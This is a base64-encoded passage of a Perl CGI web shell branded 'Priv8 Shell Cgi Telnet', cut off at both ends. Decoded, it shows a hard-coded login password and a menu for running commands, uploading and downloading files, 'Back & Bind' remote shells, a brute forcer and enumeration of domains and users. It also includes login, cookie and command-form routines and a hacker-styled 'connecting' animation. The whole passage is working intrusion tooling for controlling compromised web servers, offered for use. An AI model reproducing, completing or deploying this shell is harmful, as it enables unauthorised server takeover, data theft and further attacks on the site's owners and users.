JyBvbmNsaWNrPSciICsgYmFjayArICInIHZhbHVlPUNhbmNlbD48aW5wdXQgdHlwZT1oaWRkZW4gbmFtZT1hIHZhbHVlPSdndWknPjxpbnB1dCB0eXBlPWhpZGRlbiBuYW1lPWQgdmFsdWU9JyRkaXInPjxpbnB1dCB0eXBlPWhpZGRlbiBuYW1lPWYgdmFsdWU9JyIrZmlsZSsiJz48L2Zvcm0+IjsKCWRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJ0ZXh0XyIgKyBpKS5mb2N1cygpOwp9CmZ1bmN0aW9uIHJtX3JlbmFtZV9mb3JtKGksZmlsZSxmKQp7CglpZihmPT0nZicpCgl7CgkJZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoIkZpbGVfIitpKS5pbm5lckhUTUw9IjxhIGhyZWY9Jz9hPWNvbW1hbmQmZD0kZGlyJmM9ZWRpdCUyMCIrZmlsZSsiJTIwJz4iICtmaWxlKyAiPC9hPiI7Cgl9ZWxzZQoJewoJCWRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJGaWxlXyIraSkuaW5uZXJIVE1MPSI8YSBocmVmPSc/YT1ndWkmZD0iK2YrIic+WyAiICtmaWxlKyAiIF08L2E+IjsKCX0KfQo8L3NjcmlwdD4KPGJvZHkgb25Mb2FkPSJkb2N1bWVudC5mLkBfLmZvY3VzKCkiIGJnY29sb3I9IiMwYzBjMGMiIHRvcG1hcmdpbj0iMCIgbGVmdG1hcmdpbj0iMCIgbWFyZ2lud2lkdGg9IjAiIG1hcmdpbmhlaWdodD0iMCI+CjxjZW50ZXI+PGNvZGU+Cjx0YWJsZSBib3JkZXI9IjEiIHdpZHRoPSIxMDAlIiBjZWxsc3BhY2luZz0iMCIgY2VsbHBhZGRpbmc9IjIiPgo8dHI+Cgk8dGQgYWxpZ249ImNlbnRlciIgcm93c3Bhbj0yPgoJCTxiPjxmb250IHNpemU9IjUiPiRFZGl0UGVyc2lvbjwvZm9udD48L2I+Cgk8L3RkPgoKCTx0ZD4KCgkJPGZvbnQgZmFjZT0iVmVyZGFuYSIgc2l6ZT0iMiI+JEVOVnsiU0VSVkVSX1NPRlRXQVJFIn08L2ZvbnQ+Cgk8L3RkPgoJPHRkPlNlcnZlciBJUDo8Zm9udCBjb2xvcj0iI2ZmZmZmZiI+ICRFTlZ7J1NFUlZFUl9BRERSJ308L2ZvbnQ+IHwgWW91ciBJUDogPGZvbnQgY29sb3I9IiNmZmZmZmYiPiRFTlZ7J1JFTU9URV9BRERSJ308L2ZvbnQ+Cgk8L3RkPgoKPC90cj4KCjx0cj4KPHRkIGNvbHNwYW49IjMiPjxmb250IGZhY2U9IlZlcmRhbmEiIHNpemU9IjIiPgo8YSBocmVmPSIkU2NyaXB0TG9jYXRpb24iPkhvbWU8L2E+IHwgCjxhIGhyZWY9IiRTY3JpcHRMb2NhdGlvbj9hPWNvbW1hbmQmZD0kRW5jb2RlZEN1cnJlbnREaXIiPkNvbW1hbmQ8L2E+IHwKPGEgaHJlZj0iJFNjcmlwdExvY2F0aW9uP2E9Z3VpJmQ9JEVuY29kZWRDdXJyZW50RGlyIj5HVUk8L2E+IHwgCjxhIGhyZWY9IiRTY3JpcHRMb2NhdGlvbj9hPXVwbG9hZCZkPSRFbmNvZGVkQ3VycmVudERpciI+VXBsb2FkIEZpbGU8L2E+IHwgCjxhIGhyZWY9IiRTY3JpcHRMb2NhdGlvbj9hPWRvd25sb2FkJmQ9JEVuY29kZWRDdXJyZW50RGlyIj5Eb3dubG9hZCBGaWxlPC9hPiB8Cgo8YSBocmVmPSIkU2NyaXB0TG9jYXRpb24/YT1iYWNrYmluZCI+QmFjayAmIEJpbmQ8L2E+IHwKPGEgaHJlZj0iJFNjcmlwdExvY2F0aW9uP2E9YnJ1dGVmb3JjZXIiPkJydXRlIEZvcmNlcjwvYT4gfAo8YSBocmVmPSIkU2NyaXB0TG9jYXRpb24/YT1jaGVja2xvZyI+Q2hlY2sgTG9nPC9hPiB8CjxhIGhyZWY9IiRTY3JpcHRMb2NhdGlvbj9hPWRvbWFpbnN1c2VyIj5Eb21haW5zL1VzZXJzPC9hPiB8CjxhIGhyZWY9IiRTY3JpcHRMb2NhdGlvbj9hPWxvZ291dCI+TG9nb3V0PC9hPiB8CjxhIHRhcmdldD0nX2JsYW5rJyBocmVmPSIjIj5IZWxwPC9hPgoKPC9mb250PjwvdGQ+CjwvdHI+CjwvdGFibGU+Cjxmb250IGlkPSJSZXNwb25zZURhdGEiIGNvbG9yPSIjZmY5OWNjIiA+CkVORAp9CgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgUHJpbnRzIHRoZSBMb2dpbiBTY3JlZW4KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpzdWIgUHJpbnRMb2dpblNjcmVlbgp7CgoJcHJpbnQgPDxFTkQ7CjxwcmU+PHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiPgpUeXBpbmdUZXh0ID0gZnVuY3Rpb24oZWxlbWVudCwgaW50ZXJ2YWwsIGN1cnNvciwgZmluaXNoZWRDYWxsYmFjaykgewogIGlmKCh0eXBlb2YgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQgPT0gInVuZGVmaW5lZCIpIHx8ICh0eXBlb2YgZWxlbWVudC5pbm5lckhUTUwgPT0gInVuZGVmaW5lZCIpKSB7CiAgICB0aGlzLnJ1bm5pbmcgPSB0cnVlOwkvLyBOZXZlciBydW4uCiAgICByZXR1cm47CiAgfQogIHRoaXMuZWxlbWVudCA9IGVsZW1lbnQ7CiAgdGhpcy5maW5pc2hlZENhbGxiYWNrID0gKGZpbmlzaGVkQ2FsbGJhY2sgPyBmaW5pc2hlZENhbGxiYWNrIDogZnVuY3Rpb24oKSB7IHJldHVybjsgfSk7CiAgdGhpcy5pbnRlcnZhbCA9ICh0eXBlb2YgaW50ZXJ2YWwgPT0gInVuZGVmaW5lZCIgPyAxMDAgOiBpbnRlcnZhbCk7CiAgdGhpcy5vcmlnVGV4dCA9IHRoaXMuZWxlbWVudC5pbm5lckhUTUw7CiAgdGhpcy51bnBhcnNlZE9yaWdUZXh0ID0gdGhpcy5vcmlnVGV4dDsKICB0aGlzLmN1cnNvciA9IChjdXJzb3IgPyBjdXJzb3IgOiAiIik7CiAgdGhpcy5jdXJyZW50VGV4dCA9ICIiOwogIHRoaXMuY3VycmVudENoYXIgPSAwOwogIHRoaXMuZWxlbWVudC50eXBpbmdUZXh0ID0gdGhpczsKICBpZih0aGlzLmVsZW1lbnQuaWQgPT0gIiIpIHRoaXMuZWxlbWVudC5pZCA9ICJ0eXBpbmd0ZXh0IiArIFR5cGluZ1RleHQuY3VycmVudEluZGV4Kys7CiAgVHlwaW5nVGV4dC5hbGwucHVzaCh0aGlzKTsKICB0aGlzLnJ1bm5pbmcgPSBmYWxzZTsKICB0aGlzLmluVGFnID0gZmFsc2U7CiAgdGhpcy50YWdCdWZmZXIgPSAiIjsKICB0aGlzLmluSFRNTEVudGl0eSA9IGZhbHNlOwogIHRoaXMuSFRNTEVudGl0eUJ1ZmZlciA9ICIiOwp9ClR5cGluZ1RleHQuYWxsID0gbmV3IEFycmF5KCk7ClR5cGluZ1RleHQuY3VycmVudEluZGV4ID0gMDsKVHlwaW5nVGV4dC5ydW5BbGwgPSBmdW5jdGlvbigpIHsKICBmb3IodmFyIGkgPSAwOyBpIDwgVHlwaW5nVGV4dC5hbGwubGVuZ3RoOyBpKyspIFR5cGluZ1RleHQuYWxsW2ldLnJ1bigpOwp9ClR5cGluZ1RleHQucHJvdG90eXBlLnJ1biA9IGZ1bmN0aW9uKCkgewogIGlmKHRoaXMucnVubmluZykgcmV0dXJuOwogIGlmKHR5cGVvZiB0aGlzLm9yaWdUZXh0ID09ICJ1bmRlZmluZWQiKSB7CiAgICBzZXRUaW1lb3V0KCJkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnIiArIHRoaXMuZWxlbWVudC5pZCArICInKS50eXBpbmdUZXh0LnJ1bigpIiwgdGhpcy5pbnRlcnZhbCk7CS8vIFdlIGhhdmVuJ3QgZmluaXNoZWQgbG9hZGluZyB5ZXQuICBIYXZlIHBhdGllbmNlLgogICAgcmV0dXJuOwogIH0KICBpZih0aGlzLmN1cnJlbnRUZXh0ID09ICIiKSB0aGlzLmVsZW1lbnQuaW5uZXJIVE1MID0gIiI7Ci8vICB0aGlzLm9yaWdUZXh0ID0gdGhpcy5vcmlnVGV4dC5yZXBsYWNlKC88KFtePF0pKj4vLCAiIik7ICAgICAvLyBTdHJpcCBIVE1MIGZyb20gdGV4dC4KICBpZih0aGlzLmN1cnJlbnRDaGFyIDwgdGhpcy5vcmlnVGV4dC5sZW5ndGgpIHsKICAgIGlmKHRoaXMub3JpZ1RleHQuY2hhckF0KHRoaXMuY3VycmVudENoYXIpID09ICI8IiAmJiAhdGhpcy5pblRhZykgewogICAgICB0aGlzLnRhZ0J1ZmZlciA9ICI8IjsKICAgICAgdGhpcy5pblRhZyA9IHRydWU7CiAgICAgIHRoaXMuY3VycmVudENoYXIrKzsKICAgICAgdGhpcy5ydW4oKTsKICAgICAgcmV0dXJuOwogICAgfSBlbHNlIGlmKHRoaXMub3JpZ1RleHQuY2hhckF0KHRoaXMuY3VycmVudENoYXIpID09ICI+IiAmJiB0aGlzLmluVGFnKSB7CiAgICAgIHRoaXMudGFnQnVmZmVyICs9ICI+IjsKICAgICAgdGhpcy5pblRhZyA9IGZhbHNlOwogICAgICB0aGlzLmN1cnJlbnRUZXh0ICs9IHRoaXMudGFnQnVmZmVyOwogICAgICB0aGlzLmN1cnJlbnRDaGFyKys7CiAgICAgIHRoaXMucnVuKCk7CiAgICAgIHJldHVybjsKICAgIH0gZWxzZSBpZih0aGlzLmluVGFnKSB7CiAgICAgIHRoaXMudGFnQnVmZmVyICs9IHRoaXMub3JpZ1RleHQuY2hhckF0KHRoaXMuY3VycmVudENoYXIpOwogICAgICB0aGlzLmN1cnJlbnRDaGFyKys7CiAgICAgIHRoaXMucnVuKCk7CiAgICAgIHJldHVybjsKICAgIH0gZWxzZSBpZih0aGlzLm9yaWdUZXh0LmNoYXJBdCh0aGlzLmN1cnJlbnRDaGFyKSA9PSAiJiIgJiYgIXRoaXMuaW5IVE1MRW50aXR5KSB7CiAgICAgIHRoaXMuSFRNTEVudGl0eUJ1ZmZlciA9ICImIjsKICAgICAgdGhpcy5pbkhUTUxFbnRpdHkgPSB0cnVlOwogICAgICB0aGlzLmN1cnJlbnRDaGFyKys7CiAgICAgIHRoaXMucnVuKCk7CiAgICAgIHJldHVybjsKICAgIH0gZWxzZSBpZih0aGlzLm9yaWdUZXh0LmNoYXJBdCh0aGlzLmN1cnJlbnRDaGFyKSA9PSAiOyIgJiYgdGhpcy5pbkhUTUxFbnRpdHkpIHsKICAgICAgdGhpcy5IVE1MRW50aXR5QnVmZmVyICs9ICI7IjsKICAgICAgdGhpcy5pbkhUTUxFbnRpdHkgPSBmYWxzZTsKICAgICAgdGhpcy5jdXJyZW50VGV4dCArPSB0aGlzLkhUTUxFbnRpdHlCdWZmZXI7CiAgICAgIHRoaXMuY3VycmVudENoYXIrKzsKICAgICAgdGhpcy5ydW4oKTsKICAgICAgcmV0dXJuOwogICAgfSBlbHNlIGlmKHRoaXMuaW5IVE1MRW50aXR5KSB7CiAgICAgIHRoaXMuSFRNTEVudGl0eUJ1ZmZlciArPSB0aGlzLm9yaWdUZXh0LmNoYXJBdCh0aGlzLmN1cnJlbnRDaGFyKTsKICAgICAgdGhpcy5jdXJyZW50Q2hhcisrOwogICAgICB0aGlzLnJ1bigpOwogICAgICByZXR1cm47CiAgICB9IGVsc2UgewogICAgICB0aGlzLmN1cnJlbnRUZXh0ICs9IHRoaXMub3JpZ1RleHQuY2hhckF0KHRoaXMuY3VycmVudENoYXIpOwogICAgfQogICAgdGhpcy5lbGVtZW50LmlubmVySFRNTCA9IHRoaXMuY3VycmVudFRleHQ7CiAgICB0aGlzLmVsZW1lbnQuaW5uZXJIVE1MICs9ICh0aGlzLmN1cnJlbnRDaGFyIDwgdGhpcy5vcmlnVGV4dC5sZW5ndGggLSAxID8gKHR5cGVvZiB0aGlzLmN1cnNvciA9PSAiZnVuY3Rpb24iID8gdGhpcy5jdXJzb3IodGhpcy5jdXJyZW50VGV4dCkgOiB0aGlzLmN1cnNvcikgOiAiIik7CiAgICB0aGlzLmN1cnJlbnRDaGFyKys7CiAgICBzZXRUaW1lb3V0KCJkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnIiArIHRoaXMuZWxlbWVudC5pZCArICInKS50eXBpbmdUZXh0LnJ1bigpIiwgdGhpcy5pbnRlcnZhbCk7CiAgfSBlbHNlIHsKCXRoaXMuY3VycmVudFRleHQgPSAiIjsKCXRoaXMuY3VycmVudENoYXIgPSAwOwogICAgICAgIHRoaXMucnVubmluZyA9IGZhbHNlOwogICAgICAgIHRoaXMuZmluaXNoZWRDYWxsYmFjaygpOwogIH0KfQo8L3NjcmlwdD4KPC9wcmU+Cgo8Zm9udCBzdHlsZT0iZm9udDogMTVwdCBWZXJkYW5hOyBjb2xvcjogYmx1ZTsiPlsgUHJpdjggU2hlbGwgQ2dpIFRlbG5ldCBdPC9mb250Pjxicj48Zm9udCBzdHlsZT0iZm9udDogOHB0IFZlcmRhbmE7IGNvbG9yOiBibHVlOyI+UGFzc3dvcmQ6IGhhY2tlcjA4ODIgPC9mb250Pjxicjxicj4KPHRhYmxlIGFsaWduPSJjZW50ZXIiIGJvcmRlcj0iMSIgd2lkdGg9IjYwMCIgaGVpZ2g+Cjx0Ym9keT48dHI+Cjx0ZCB2YWxpZ249InRvcCIgYmFja2dyb3VuZD0iaHR0cDovL2RsLmRyb3Bib3guY29tL3UvMTA4NjAwNTEvaW1hZ2VzL21hdHJhbi5naWYiPjxwIGlkPSJoYWNrIiBzdHlsZT0ibWFyZ2luLWxlZnQ6IDNweDsiPgo8Zm9udCBjb2xvcj0iIzA5NjBmZiI+IFBsZWFzZSBXYWl0IC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC48L2ZvbnQ+IDxicj4KCjxmb250IGNvbG9yPSIjMDk2MGZmIj4gVHJ5aW5nIGNvbm5lY3QgdG8gU2VydmVyIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC48L2ZvbnQ+PGJyPgo8Zm9udCBjb2xvcj0iI0YwMDAwMCI+PGZvbnQgY29sb3I9IiMwOTYwZmYiPn5cJDwvZm9udD4gQ29ubmVjdGVkICEgPC9mb250Pjxicj4KPGZvbnQgY29sb3I9IiMwOTYwZmYiPjxmb250IGNvbG9yPSIjMDk2MGZmIj4kU2VydmVyTmFtZX48L2ZvbnQ+IENoZWNraW5nIFNlcnZlciAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuPC9mb250PiA8YnI+Cgo8Zm9udCBjb2xvcj0iIzA5NjBmZiI+PGZvbnQgY29sb3I9IiMwOTYwZmYiPiRTZXJ2ZXJOYW1lfjwvZm9udD4gVHJ5aW5nIGNvbm5lY3QgdG8gQ29tbWFuZCAuIC4gLiAuIC4gLiAuIC4gLiAuIC48L2ZvbnQ+PGJyPgoKPGZvbnQgY29sb3I9IiNGMDAwMDAiPjxmb250IGNvbG9yPSIjMDk2MGZmIj4kU2VydmVyTmFtZX48L2ZvbnQ+XCQgQ29ubmVjdGVkIENvbW1hbmQhIDwvZm9udD48YnI+Cjxmb250IGNvbG9yPSIjMDk2MGZmIj48Zm9udCBjb2xvcj0iIzA5NjBmZiI+JFNlcnZlck5hbWV+PGZvbnQgY29sb3I9IiNGMDAwMDAiPlwkPC9mb250PjwvZm9udD4gT0shIFlvdSBjYW4ga2lsbCBpdCE8L2ZvbnQ+CjwvdHI+CjwvdGJvZHk+PC90YWJsZT4KPGJyPgoKPHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiPgpuZXcgVHlwaW5nVGV4dChkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiaGFjayIpLCAzMCwgZnVuY3Rpb24oaSl7IHZhciBhciA9IG5ldyBBcnJheSgiXyIsIiIpOyByZXR1cm4gIiAiICsgYXJbaS5sZW5ndGggJSBhci5sZW5ndGhdOyB9KTsKVHlwaW5nVGV4dC5ydW5BbGwoKTsKCjwvc2NyaXB0PgpFTkQKfQoKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIEFkZCBodG1sIHNwZWNpYWwgY2hhcnMKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpzdWIgSHRtbFNwZWNpYWxDaGFycygkKXsKCW15ICR0ZXh0ID0gc2hpZnQ7CgkkdGV4dCA9fiBzLyYvJmFtcDsvZzsKCSR0ZXh0ID1+IHMvIi8mcXVvdDsvZzsKCSR0ZXh0ID1+IHMvJy8mIzAzOTsvZzsKCSR0ZXh0ID1+IHMvPC8mbHQ7L2c7CgkkdGV4dCA9fiBzLz4vJmd0Oy9nOwoJcmV0dXJuICR0ZXh0Owp9CiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KIyBBZGQgbGluayBmb3IgZGlyZWN0b3J5CiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0Kc3ViIEFkZExpbmtEaXIoJCkKewoJbXkgJGFjPXNoaWZ0OwoJbXkgQGRpcj0oKTsKCWlmKCRXaW5OVCkKCXsKCQlAZGlyPXNwbGl0KC9cXC8sJEN1cnJlbnREaXIpOwoJfWVsc2UKCXsKCQlAZGlyPXNwbGl0KCIvIiwmdHJpbSgkQ3VycmVudERpcikpOwoJfQoJbXkgJHBhdGg9IiI7CglteSAkcmVzdWx0PSIiOwoJZm9yZWFjaCAoQGRpcikKCXsKCQkkcGF0aCAuPSAkXy4kUGF0aFNlcDsKCQkkcmVzdWx0Lj0iPGEgaHJlZj0nP2E9Ii4kYWMuIiZkPSIuJHBhdGguIic+Ii4kXy4kUGF0aFNlcC4iPC9hPiI7Cgl9CglyZXR1cm4gJHJlc3VsdDsKfQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgUHJpbnRzIHRoZSBtZXNzYWdlIHRoYXQgaW5mb3JtcyB0aGUgdXNlciBvZiBhIGZhaWxlZCBsb2dpbgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCnN1YiBQcmludExvZ2luRmFpbGVkTWVzc2FnZQp7CglwcmludCA8PEVORDsKPGJyPkxvZ2luIDogQWRtaW5pc3RyYXRvcjxicj4KClBhc3N3b3JkOjxicj4KTG9naW4gaW5jb3JyZWN0PGJyPjxicj4KRU5ECn0KCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KIyBQcmludHMgdGhlIEhUTUwgZm9ybSBmb3IgbG9nZ2luZyBpbgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCnN1YiBQcmludExvZ2luRm9ybQp7CglwcmludCA8PEVORDsKPGZvcm0gbmFtZT0iZiIgbWV0aG9kPSJQT1NUIiBhY3Rpb249IiRTY3JpcHRMb2NhdGlvbiI+CjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImEiIHZhbHVlPSJsb2dpbiI+CkxvZ2luIDogQWRtaW5pc3RyYXRvcjxicj4KUGFzc3dvcmQ6PGlucHV0IHR5cGU9InBhc3N3b3JkIiBuYW1lPSJwIj4KPGlucHV0IGNsYXNzPSJzdWJtaXQiIHR5cGU9InN1Ym1pdCIgdmFsdWU9IkVudGVyIj4KPC9mb3JtPgpFTkQKfQoKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIFByaW50cyB0aGUgZm9vdGVyIGZvciB0aGUgSFRNTCBQYWdlCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0Kc3ViIFByaW50UGFnZUZvb3Rlcgp7CglwcmludCAiPC9jb2RlPjwvY2VudGVyPjwvYm9keT48L2h0bWw+IjsKfQoKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIFJldHJlaXZlcyB0aGUgdmFsdWVzIG9mIGFsbCBjb29raWVzLiBUaGUgY29va2llcyBjYW4gYmUgYWNjZXNzZXMgdXNpbmcgdGhlCiMgdmFyaWFibGUgJENvb2tpZXN7J30KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpzdWIgR2V0Q29va2llcwp7CglAaHR0cGNvb2tpZXMgPSBzcGxpdCgvOyAvLCRFTlZ7J0hUVFBfQ09PS0lFJ30pOwoJZm9yZWFjaCAkY29va2llKEBodHRwY29va2llcykKCXsKCQkoJGlkLCAkdmFsKSA9IHNwbGl0KC89LywgJGNvb2tpZSk7CgkJJENvb2tpZXN7JGlkfSA9ICR2YWw7Cgl9Cn0KCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KIyBQcmludHMgdGhlIHNjcmVlbiB3aGVuIHRoZSB1c2VyIGxvZ3Mgb3V0CiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0Kc3ViIFByaW50TG9nb3V0U2NyZWVuCnsKCXByaW50ICJDb25uZWN0aW9uIGNsb3NlZCBieSBmb3JlaWduIGhvc3QuPGJyPjxicj4iOwp9CgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgTG9ncyBvdXQgdGhlIHVzZXIgYW5kIGFsbG93cyB0aGUgdXNlciB0byBsb2dpbiBhZ2FpbgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCnN1YiBQZXJmb3JtTG9nb3V0CnsKCXByaW50ICJTZXQtQ29va2llOiBTQVZFRFBXRD07XG4iOyAjIHJlbW92ZSBwYXNzd29yZCBjb29raWUKCSZQcmludFBhZ2VIZWFkZXIoInAiKTsKCSZQcmludExvZ291dFNjcmVlbjsKCgkmUHJpbnRMb2dpblNjcmVlbjsKCSZQcmludExvZ2luRm9ybTsKCSZQcmludFBhZ2VGb290ZXI7CglleGl0Owp9CgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgVGhpcyBmdW5jdGlvbiBpcyBjYWxsZWQgdG8gbG9naW4gdGhlIHVzZXIuIElmIHRoZSBwYXNzd29yZCBtYXRjaGVzLCBpdAojIGRpc3BsYXlzIGEgcGFnZSB0aGF0IGFsbG93cyB0aGUgdXNlciB0byBydW4gY29tbWFuZHMuIElmIHRoZSBwYXNzd29yZCBkb2Vucyd0CiMgbWF0Y2ggb3IgaWYgbm8gcGFzc3dvcmQgaXMgZW50ZXJlZCwgaXQgZGlzcGxheXMgYSBmb3JtIHRoYXQgYWxsb3dzIHRoZSB1c2VyCiMgdG8gbG9naW4KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpzdWIgUGVyZm9ybUxvZ2luIAp7CglpZigkTG9naW5QYXNzd29yZCBlcSAkUGFzc3dvcmQpICMgcGFzc3dvcmQgbWF0Y2hlZAoJewoJCXByaW50ICJTZXQtQ29va2llOiBTQVZFRFBXRD0kTG9naW5QYXNzd29yZDtcbiI7CgkJJlByaW50UGFnZUhlYWRlcjsKCQlwcmludCAmTGlzdERpcjsKCX0KCWVsc2UgIyBwYXNzd29yZCBkaWRuJ3QgbWF0Y2gKCXsKCQkmUHJpbnRQYWdlSGVhZGVyKCJwIik7CgkJJlByaW50TG9naW5TY3JlZW47CgkJaWYoJExvZ2luUGFzc3dvcmQgbmUgIiIpICMgc29tZSBwYXNzd29yZCB3YXMgZW50ZXJlZAoJCXsKCQkJJlByaW50TG9naW5GYWlsZWRNZXNzYWdlOwoKCQl9CgkJJlByaW50TG9naW5Gb3JtOwoJCSZQcmludFBhZ2VGb290ZXI7CgkJZXhpdDsKCX0KfQoKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIFByaW50cyB0aGUgSFRNTCBmb3JtIHRoYXQgYWxsb3dzIHRoZSB1c2VyIHRvIGVudGVyIGNvbW1hbmRzCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0Kc3ViIFByaW50Q29tbWFuZExpbmVJbnB1dEZvcm0KewoJbXkgJGRpcj0gIjxzcGFuIHN0eWxlPSdmb250OiAxMXB0IFZlcmRhbmE7IGZvbnQtd2VpZ2h0OiBib2xkOyc+Ii4mQWRkTGlua0RpcigiY29tbWFuZCIpLiI8L3NwYW4+IjsKCSRQcm9tcHQgPSAkV2luTlQgPyAiJGRpciA+ICIgOiAiPGZvbnQgY29sb3I9JyM2NmZmNjYnPlthZG1pblxAJFNlcnZlck5hbWUgJGRpcl1cJDwvZm9udD4gIjsKCXJldHVybiA8PEVORDsKPGZvcm0gbmFtZT0iZiIgbWV0aG9kPSJQT1NUIiBhY3Rpb249IiRTY3JpcHRMb2NhdGlvbiI+Cgo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJhIiB2YWx1ZT0iY29tbWFuZCI+Cgo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJkIiB2YWx1ZT0iJEN1cnJlbnREaXIiPgokUHJvbXB0CjxpbnB1dCB0eXBlPSJ0ZXh0IiBzaXplPSI1MCIgbmFtZT0iYyI+CjxpbnB1dCBjbGFzcz0ic3VibWl0InR5cGU9InN1Ym1pdCIgdmFsdWU9IkVudGVyIj4KPC9mb3JtPgpFTkQKfQoKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIFByaW50cyB0aGUgSFRNTCBmb3JtIHRoYXQgYWxsb3dzIHRoZSB1c2VyIHRvIGRvd25sb2FkIGZpbGVzCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0Kc3ViIFByaW50RmlsZURvd25sb2FkRm9ybQp7CglteSAkZGlyID0gJkFkZExpbmtEaXIoImRvd25sb2FkIik7IAoJJFByb21wdCA9ICRXaW5OVCA/ICIkZGlyID4gIiA6ICJbYWRtaW5cQCRTZXJ2ZXJOYW1lICRkaXJdXCQgIjsKCXJldHVybiA8PEVORDsKPGZvcm0gbmFtZT0iZiIgbWV0aG9kPSJQT1NUIiBhY3Rpb249IiRTY